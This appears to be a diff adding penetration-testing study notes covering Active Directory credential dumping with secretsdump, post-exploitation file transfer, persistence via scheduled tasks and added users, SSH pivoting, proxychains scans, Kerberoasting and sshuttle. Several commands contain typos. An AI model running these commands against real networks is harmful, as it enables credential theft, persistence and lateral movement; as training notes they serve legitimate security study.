@@ -1,0 +1,61 @@
+AD Enumeration script:
+    secretsdump.py == DUMP LOCAL NTLM SAM HASHES
+
+
+Post Exploitation:
+    -File transfer cmds:
+        FTP:
+        ftp <IP>
+
+        Linux:
+            wget
+
+        Windows:
+            certutile.exe
+
+
+
+-Maintening Access:
+    Run Scheduled Task:
+        run scheduleme
+        run schtaskabuse
+
+    Add a user:
+        net user <userName> <passwd> /add
+
+
+
+-Pivoting:
+    using a proxy technique to pivot and access via anew discovered machine a non directly accessible network from our initial compromised machine
+
+    Kali:
+        cat /etc/proxychains.conf
+        use the "socks" with loopback address
+
+        1- Establish Port Forwarding
+            ssh -f -N -D <Binding Port> -i pivot >userName>@>IP>
+                -f == background
+                -N == Port Forwarding
+                -D == Port Binding
+
+        2-Use proxychains to perform:
+            run nmap through proxychains:
+                proxychains nmap 10.10.10.225 -sT
+                    -sT == TCP connect scan because SYN scan not work often via proxychains
+
+            run Kerberosting attack via proxychains:
+                proxychains GetUserSPNs.py <DomanainName>.<LOCAL>/<userName>:<passwd> -dc-ip <IP> -requets
+
+            run RDP via proxychains:
+                proxychains xfreerdp /u:<userName> /p:<passwd> /v:<IP>
+
+        Sshuttle - tool permit to attack without using proxychains <WantedScript> each time:
+            sudo pip install sshuttle
+            sshuttle -r <userName>@<IP> <IP Range> --ssh-cmd "ssh -i pivot"
+
+                nmap 10.10.10.225 -sT
+
+
+
+
+
